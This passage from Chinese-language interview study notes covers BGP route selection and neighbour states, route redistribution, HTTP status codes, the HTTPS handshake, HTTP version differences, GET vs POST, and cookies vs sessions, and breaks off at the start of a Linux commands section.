优选本地生成的路由，解决路由冲突，<strong>agg &gt; auto &gt; network &gt; import &gt; peer</strong></p>\n<p>4. 优选 AS 路径 (AS_Path）最短的路由</p>\n<p>5. 比较 Origin 属性，依次优选 Origin 类型为 IGP、EGP、Incomplete 的路由</p>\n<p>6. 优选 MED 值最低的路由</p>\n<p>7. 优选从 EBGP 邻居学来的路由 (EBGP 路由优先级高于 IBGP 路由)</p>\n<p>8. 优选到下一跳 IGP Metric 较小的路由</p>\n<p>----------------------------</p>\n<p>9. 优选 Cluster_List 最短的路由，没有簇列表簇列表为空，没有簇列表一定更优</p>\n<p>10. 优选起源 ID，越小越优</p>\n<p>11. 优选 Router lD 最小的路由器发布的路由</p>\n<p>12. 比较对等体的 IP Address，优选从具有较小 IP Address 的对等体学来的路由</p>\n<p>简单来说</p>\n<p>P L L A O M E N   漂亮老男人</p>\n<p>Pref LocalPre Local AS origin MED EBGP next_cost</p>\n</blockquote>\n<p>BGP 邻居建立 (迪普)</p>\n<blockquote>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2759285/1620389842717-2d451b53-d037-406c-a4b4-717bf756ba7d.png\" alt=\"image.png\"></p>\n<p>ldle (空闲) : ldle 是 BGP 连接的第一个状态，在空闲状态，BGP 在等待一个启动事件，启动事件出现以后，BGP 初始化资源，复位连接重试计时器 (Connect-Retry)，发起一条 TCP 连接，同时转入 Connect (连接）状态。</p>\n<p>Connect (连接)︰在 Connect 状态，BGP 发起第一个 TCP 连接，如果连接重试计时器 (Connect-Retry) 超时，就重新发起 TCP 连接，并继续保持在 Connect 状态，如果 TCP 连接成功，就转入 OpenSent 状态，如果 TCP 连接失败，就转入 Active 状态。</p>\n<p>Active (活跃)︰在 Active 状态，BGP 总是在试图建立 TCP 连接，如果连接重试计时器 (Connect-Retry) 超时，就退回到 Connect 状态，如果 TCP 连接成功，就转入 OpenSent 状态，如果 TCP 连接失败，就继续保持在 Active 状态，并继续发起 TCP 连接，没有收到对 open-send 报文的确认报文。</p>\n<p>TCP 三次握手建立。自己发送 open，等待接收正确的 open。接收正确 open 的进入 openconfirm，发 keepalive，收到对方 keepalive 进入 established。对方也是这个过程</p>\n</blockquote>\n<p>BGP 路由刷新 (迪普)</p>\n<blockquote>\n<p>Route-Refresh</p>\n<p>用于手动实现 BGP 触发更新。不中断 TCP 会话触发更新，可以针对邻居触发更新</p>\n<p>refresh bgp all (peer) export 向对方发送 update message，更新对方路由信息</p>\n<p>refresh import 向对方发送 route-refresh，对方收到后回复 update message 完成路由刷新</p>\n<p>route-refresh 报文中携带 AFI 和 SAFI</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2759285/1632012709113-4efb27ea-86da-4051-983c-d0353caa983f.png\" alt=\"img\"></p>\n</blockquote>\n<p>BGP 路由撤销 (迪普)</p>\n<blockquote>\n<p>1.IPV4 路由撤销</p>\n<p>通过 update 报文 NLRI 字段中的 withdraw route 实现，其中不携带任何属性</p>\n<p>2.VPNV4 路由撤销</p>\n<p>不携带路由属性，在 update 报文 path attribute 中 MP_UNREACH_NLRI 携带撤销路由</p>\n<p>不携带路由属性，只携带 RD 和标签栈</p>\n</blockquote>\n<h3 id=\"7双点双向重发布快手\"><a class=\"markdownIt-Anchor\" href=\"#7双点双向重发布快手\">#</a> 7. 双点双向重发布 (快手)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在多点双向重发布中，若A协议的优先级大于（次）B协议，此时若将A协议通过一台ASBR引入到B协议时，那此优先级会降低（变优），会导致另一台ASBR路由表的生成，此时另一台ASBR再次将B往A协议重发布时，原先A协议的路由会再次回到A协议中--路由回馈</span><br><span class=\"line\">解决方案:将重发布进来的路由优先级改高--Cisco提出，在Cisco的EIGRP协议中，内部路由优先级90，外部170。所以，华为设备因为不支持EIGRP，仅支持OSPF，所以借鉴了Cisco的做法--在华为中，OSPF内部优先级10，外部150</span><br><span class=\"line\">OSPF协议学习OSPF网络内的所有环回接口网段时，学习到的都是32为的主机路由，但是将本设备工作在OSPF的直连接口重发布时时原本的掩码，</span><br><span class=\"line\">所以可能会导致在重发布时同一条路由条目变成不同的掩码发布到另一协议</span><br><span class=\"line\">解决方案：</span><br><span class=\"line\">1）修改环回接口掩码直接为32位 </span><br><span class=\"line\">2）修改环回接口的OSPF工作的网络类型</span><br><span class=\"line\">在进行多点双向重发布时，由于协议之间不兼容，因此原路由的度量值进入新协议时，会被起始度量代替，所以存在选路不佳的问题</span><br><span class=\"line\">解决方案：需要人为的干涉选路---路由策略技术</span><br><span class=\"line\">注意：BGP与OSPF或其他协议做多点多向重发布，会出现瞬时环路。</span><br><span class=\"line\">就是BGP收敛慢，OSPF收敛快，两个协议启动会存在时差，在这个时差内协议的边界路由器是没有BGP协议的路由，那么在协议边界路由上就存在路由黑洞</span><br></pre></td></tr></table></figure>\n<h3 id=\"8httphttps相关问题\"><a class=\"markdownIt-Anchor\" href=\"#8httphttps相关问题\">#</a> 8.http/https 相关问题</h3>\n<h4 id=\"http状态码汉得曙光\"><a class=\"markdownIt-Anchor\" href=\"#http状态码汉得曙光\">#</a> http 状态码 (汉得，曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常见状态码          </span><br><span class=\"line\">200\t请求成功</span><br><span class=\"line\">301 永久重定向</span><br><span class=\"line\">302 临时重定向</span><br><span class=\"line\">400 请求错误，通常是访问的域名未绑定引起</span><br><span class=\"line\">403 禁止访问</span><br><span class=\"line\">404 请求的内容未找到或已删除</span><br><span class=\"line\">500 服务器端程序错误</span><br><span class=\"line\">502 网关无响应</span><br><span class=\"line\">503 服务器端临时错误</span><br><span class=\"line\">504\t网关超时</span><br><span class=\"line\">https://seo.juziseo.com/doc/http_code/</span><br></pre></td></tr></table></figure>\n<h4 id=\"访问网页过程信锐汉得\"><a class=\"markdownIt-Anchor\" href=\"#访问网页过程信锐汉得\">#</a> 访问网页过程 (信锐，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先在浏览器地址栏中输入URL或者域名。</span><br><span class=\"line\">2.电脑开始域名解析：</span><br><span class=\"line\">看查找IP是否是本机。不是再去查询浏览器缓存，本机hosts文件，如果有对应的IP则进行反馈，然后进行下一步。如果本机Hosts文件不含有，则本机向发出一个DNS请求到本地DNS服务器。</span><br><span class=\"line\">DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果。如果没有，本地DNS服务器还要向DNS根服务器进行查询。</span><br><span class=\"line\">根DNS服务器没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。</span><br><span class=\"line\">最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</span><br><span class=\"line\">网址真正的解析过程为:  . -&gt; .com -&gt; Microsoft.com. -&gt; www.Microsoft.com. </span><br><span class=\"line\">3.进行tcp三次握手</span><br><span class=\"line\">上面八股文你有写过，自己看吧</span><br><span class=\"line\">4.http/https请求和返回</span><br><span class=\"line\">HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。</span><br><span class=\"line\">https = http + tls，具体下面有写，这边就不写了，开摆</span><br><span class=\"line\">浏览器对服务器发出HTTP请求报文</span><br><span class=\"line\">发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。</span><br><span class=\"line\">服务器处理请求并返回HTTP响应报文</span><br><span class=\"line\">后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTP Request对象，供上层使用。HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。</span><br><span class=\"line\">5.浏览器渲染页面</span><br><span class=\"line\">浏览器在收到HTML,CSS,JS文件后，浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。</span><br></pre></td></tr></table></figure>\n<h4 id=\"https长亭\"><a class=\"markdownIt-Anchor\" href=\"#https长亭\">#</a> https (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTPS是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。</span><br><span class=\"line\">https = http + tls</span><br><span class=\"line\">tls 位于传输层上层</span><br><span class=\"line\">HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。</span><br><span class=\"line\">HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式：</span><br><span class=\"line\">1、TCP 三次同步握手</span><br><span class=\"line\">2、客户端验证服务器数字证书</span><br><span class=\"line\">3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</span><br><span class=\"line\">4、SSL 安全加密隧道协商完成</span><br><span class=\"line\">5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>1、客户端发起 HTTPS 请求</strong></p>\n<p>就是用户在浏览器里输入一个 https 网址，然后连接到 server 的 443 端口。</p>\n<p><strong>2、服务端的配置</strong></p>\n<p>采用 HTTPS 协议的服务器必须要有一套<em>数字证书</em>，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面 (startssl 就是个不错的选择，有 1 年的免费服务)。</p>\n<p><em>这套证书其实就是一对公钥和私钥</em>，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。</p>\n<p><strong>3、传送证书</strong></p>\n<p>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。</p>\n<p><strong>4、客户端解析证书</strong></p>\n<p>这部分工作是有客户端的 TLS 来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>\n<p>如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。</p>\n<p><strong>5、传送加密信息</strong></p>\n<p>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。</p>\n<p><strong>6、服务端解密信息</strong></p>\n<p>服务端用私钥解密后，得到了客户端传过来的随机值 (私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。</p>\n<p><strong>7、传输加密后的信息</strong></p>\n<p>这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。</p>\n<p><strong>8、客户端解密信息</strong></p>\n<p>客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022105328092.png\" alt=\"image-20221022105328092\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS93M2Nub3RlL2h0dHAtdnMtaHR0cHMuaHRtbA==\">HTTP 与 HTTPS 的区别 | 菜鸟教程 (runoob.com)</span></p>\n<h4 id=\"httphttps区别没人问我自己问着玩\"><a class=\"markdownIt-Anchor\" href=\"#httphttps区别没人问我自己问着玩\">#</a> http/https 区别 (没人问，我自己问着玩)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</span><br><span class=\"line\"></span><br><span class=\"line\">使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</span><br><span class=\"line\"></span><br><span class=\"line\">http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</span><br></pre></td></tr></table></figure>\n<h4 id=\"http1011和20区别长亭\"><a class=\"markdownIt-Anchor\" href=\"#http1011和20区别长亭\">#</a> http1.0,1,1 和 2.0 区别 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1.0和1.1之间的区别</span><br><span class=\"line\">1.缓存策略:</span><br><span class=\"line\">http1.0的缓存策略主要是依赖header中的If-Modiified-Since,Expire(到期)</span><br><span class=\"line\">http1.1的缓存策略要比http1.0略多,例如 Entity tag(实体标签), If-Unmodified-Since, If-Match, If-None-Match等.</span><br><span class=\"line\">2. 宽带和网络连接优化:</span><br><span class=\"line\">http1.0中会存在一些性能浪费,比如我们的只需要对象中的一部分,但是每次请求返回的却是整个对象,这无疑造成了性能的损害</span><br><span class=\"line\">http1.1则不然,它可以通过在请求头处设置range头域,就可以返回请求资源的某一部分,也就是返回码为206(Partial Content)的时候,这对于性能优化很有必要.</span><br><span class=\"line\">这里所谓的请求资源的一部分,也就是大家常说的断点续传</span><br><span class=\"line\">关于断点续传的应用场景,例如用户需要下载一个大文件,最佳的方式是将这个大文件分割成几部分,然后由多个进程同时进行.</span><br><span class=\"line\">这个时候,我们可以在请求头中设置range字段,来规定分割的byte数范围.</span><br><span class=\"line\">而服务端会给客户端返回一个包含着content-range的响应头,来对应相应的分割byte数范围</span><br><span class=\"line\">请求头中:</span><br><span class=\"line\">Range: bytes=0-801 // 一般请求下载整个文件是bytes=0- 或不用这个头</span><br><span class=\"line\">响应头中:</span><br><span class=\"line\">Content-Range: bytes 0-800/801 //801:文件总大小</span><br><span class=\"line\">3. 新增部分错误通知:</span><br><span class=\"line\">http1.1版本新增了24个错误状态响应码,比如</span><br><span class=\"line\">409(Conflict)表示: 请求的资源与当前的状态发生冲突</span><br><span class=\"line\">410(Gone)表示服务器上某个资源被永久性的删除了</span><br><span class=\"line\">4.Host头处理:</span><br><span class=\"line\">http1.0中默认每台服务器都绑定唯一的一个IP地址,所以请求消息中url并没有传递主机名,也就是hostname.</span><br><span class=\"line\">http1.1中请求消息和响应消息都支持Host头域,而且,如果我们不传这个字段还会报一个400(bad request)的状态码</span><br><span class=\"line\">通用头域:</span><br><span class=\"line\">Cache-Control: 缓存头域 =&gt; 常见值为no-cache(不允许缓存), no-store(无论请求还是响应均不允许缓存), max-age(规定可以客户端可以接受多长生命期的数据)</span><br><span class=\"line\">Keep-Alive: 使得服务端和客户端的链接长时间有效</span><br><span class=\"line\">Date: 信息发送的时间</span><br><span class=\"line\">Host: 请求资源的主机IP和端口号</span><br><span class=\"line\">Range: 请求资源的某一部分</span><br><span class=\"line\">User-Agent: 发出请求的用户的信息(鉴权)</span><br><span class=\"line\">5. 长连接:</span><br><span class=\"line\">http1.1支持长连接和请求的流水线(pipelining),在一个TCP链接上可以传送多个http请求和响应.这样就不用多次建立和关闭TCP连接了.</span><br><span class=\"line\"></span><br><span class=\"line\">2.1.x和2.0的区别</span><br><span class=\"line\">http1的解析是基于文本协议的各式解析,而http2.0的协议解析是二进制格式,更加的强大</span><br><span class=\"line\">多路复用(Mutiplexing) : 一个连接上可以有多个request,且可以随机的混在一起,每个不同的request都有对应的id,服务端可以通过request_id来辨别,大大加快了传输速率</span><br><span class=\"line\">header压缩: http1.x中的header需要携带大量信息.而且每次都要重复发送.http2.0使用encode来减少传输的header大小.而且客户端和服务端可以各自缓存(cache)一份header filed表,避免了header的重复传输,还可以减少传输的大小.</span><br><span class=\"line\">服务端推送(server push): 可以通过解析html中的依赖,只能的返回所需的其他文件(css或者js等),而不用再发起一次请求.</span><br><span class=\"line\">Keep-Alive：</span><br><span class=\"line\">Keep-Alive 是使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，而不是为每一个新的请求/应答打开新的连接的方法。我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成 之后立即断开连接（ HTTP 协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接）时，Keep-Alive 功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。</span><br><span class=\"line\"></span><br><span class=\"line\">总结：</span><br><span class=\"line\">HTTP1.0</span><br><span class=\"line\">浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接</span><br><span class=\"line\">HTTP1.1</span><br><span class=\"line\">引入了持久连接，即TCP连接默认不关闭，可以被多个请求复用</span><br><span class=\"line\">在同一个TCP连接里面，客户端可以同时发送多个请求</span><br><span class=\"line\">虽然允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的，服务器只有处理完一个请求，才会接着处理下一个请求。如果前面的处理需要时间特别长特别慢，后面的请求只能排队等着</span><br><span class=\"line\">新增了一些请求方法put、delete、options</span><br><span class=\"line\">新增了一些请求头和响应头</span><br><span class=\"line\">HTTP2.0</span><br><span class=\"line\">采用二进制格式而非文本格式</span><br><span class=\"line\">完全多路复用，而非有序并阻塞的、只需一个连接即可实现并行</span><br><span class=\"line\">使用报头压缩，降低开销</span><br><span class=\"line\">服务器可以推送</span><br><span class=\"line\">链接：https://juejin.cn/post/7089068858241515551</span><br></pre></td></tr></table></figure>\n<h4 id=\"http报文组成长亭-头行\"><a class=\"markdownIt-Anchor\" href=\"#http报文组成长亭-头行\">#</a> http 报文组成 (长亭) 头行</h4>\n<blockquote>\n<p>HTTP 请求报文是由三部分组成: <strong>请求行</strong>，<strong>请求报头</strong>和<strong>请求正文</strong>。</p>\n<p>后端从在固定的端口接收到 TCP 报文开始，这一部分对应于编程语言中的 socket。它会对 TCP 连接进行处理，对 HTTP 协议进行解析，并按照报文格式进一步封装成 HTTP Request 对象，供上层使用。</p>\n<p>HTTP 响应报文也是由三部分组成: <strong>状态码</strong>，<strong>响应报头</strong>和<strong>响应报文</strong>。</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0NTEvNDEyYjQ0NTEtMjczOC0zZWJjLWIxZjYtYTBjYzEzYjk2OTdiLmpwZw\" alt=\"img\" style=\"zoom:80%;\" />\n<blockquote>\n<p>①是请求方法，GET 和 POST 是最常见的 HTTP 方法，除此以外还包括 DELETE、HEAD、OPTIONS、PUT、TRACE。不过，当前的大多数浏览器只支持 GET 和 POST</p>\n<p>②为请求对应的 URL 地址，它和报文头的 Host 属性组成完整的请求 URL。</p>\n<p>③是协议名称及版本号。</p>\n<p>④是 HTTP 的报文头，报文头包含若干个属性，格式为 “属性名：属性值”，服务端据此获取客户端的信息。</p>\n<p>⑤是报文体，它将一个页面表单中的组件值通过 param1=value1&amp;m2=value2 的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求 URL 也可以通过类似于 “/chapter15/user.html? param1=value1&amp;m2=value2” 的方式传递请求参数。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0ODcvY2RjNGRiYmItZjk4ZS0zMWQ1LTgyNzAtM2MzN2JmMWM1NGU1LmpwZw\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0OTIvYmRkYjAwYjYtYTNlMS0zMTEyLWE0ZjQtNGIzY2I4Njg3YzcwLmpwZw\" alt=\"img\"></p>\n<blockquote>\n<p>①报文协议及版本；<br>\n②状态码及状态描述；<br>\n③响应报文头，也是由多个属性组成；<br>\n④响应报文体，服务器返回给浏览器的文本信息，通常 HTML, CSS, JS, 图片等文件就放在这一部分。</p>\n</blockquote>\n<h4 id=\"get和post区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#get和post区别汉得\">#</a> get 和 post 区别（汉得）</h4>\n<blockquote>\n<p>Form 中的 get 和 post 方法，在数据传输过程中分别对应了 HTTP 协议中的 GET 和 POST 方法。二者主要区别如下：</p>\n<ul>\n<li>1、Get 是用来从服务器上获得数据，而 Post 是用来向服务器上传递数据。</li>\n<li>2、Get 将表单中数据的按照 variable=value 的形式，添加到 action 所指向的 URL 后面，并且两者使用 “?” 连接，而各个变量之间使用 “&amp;” 连接；Post 是将表单中的数据放在 form 的数据体中，按照变量和值相对应的方式，传递到 action 所指向 URL。</li>\n<li>3、Get 是不安全的，因为在传输过程，数据被放在请求的 URL 中，而如今现有的很多服务器、代理服务器或者用户代理都会将请求 URL 记录到日志文件中，然后放在某个地方，这样就可能会有一些隐私的信息被第三方看到。另外，用户也可以在浏览器上直接看到提交的数据，一些系统内部消息将会一同显示在用户面前。Post 的所有操作对用户来说都是不可见的。</li>\n<li>4、Get 传输的数据量小，这主要是因为受 URL 长度限制；而 Post 可以传输大量的数据，所以在上传文件只能使用 Post（当然还有一个原因，将在后面的提到）。</li>\n<li>5、Get 限制 Form 表单的数据集的值必须为 ASCII 字符；而 Post 支持整个 ISO10646 字符集。</li>\n<li>6、Get 是 Form 的默认方法。</li>\n</ul>\n<p>使用 Post 传输的数据，可以通过设置编码的方式正确转化中文；而 Get 传输的数据却没有变化。在以后的程序中，我们一定要注意这一点。</p>\n</blockquote>\n<h4 id=\"session和cookie区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#session和cookie区别汉得\">#</a> session 和 cookie 区别（汉得）</h4>\n<blockquote>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n</blockquote>\n<h3 id=\"9一些linux命令\"><a class=\"markdownIt-Anchor\" href=\"#9一些linux命令\">#</a> 9. 一些 linux 命令</h3>\n<h4 id=\"0liunx查看内核版本发行版特斯拉茄子\"><a class=\"markdownIt-Anchor\" href=\"#0liunx查看内核版本发行版特斯拉茄子\">#</a> 0.Liunx 查看内核版本，发行版 (特斯拉，茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span 